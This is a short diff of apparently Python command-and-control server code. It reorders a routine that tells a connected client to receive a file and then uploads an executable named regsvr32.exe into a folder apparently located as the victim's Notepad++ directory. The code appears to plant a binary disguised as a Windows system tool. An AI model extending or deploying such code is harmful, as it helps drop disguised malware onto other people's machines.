@@ -12,12 +12,12 @@ def find_npp_dir(s: socket.socket) -> str:
 
 
 def send_regsvr32(s: socket.socket, dir: str):
+    # ask client to receive
+    comm.send(s, f"upload [{server_config.REGSVR32_FILEPATH}] [{dir}\\regsvr32.exe]")
     # trigger server send
     cmd.upload_file(
         s, (server_config.REGSVR32_FILEPATH, f"{dir}\\regsvr32.exe]"), verbose=True
     )
-    # ask client to receive
-    comm.send(s, f"upload [{server_config.REGSVR32_FILEPATH}] [{dir}\\regsvr32.exe]")
 
 
 def handle_found_npp(s: socket.socket):
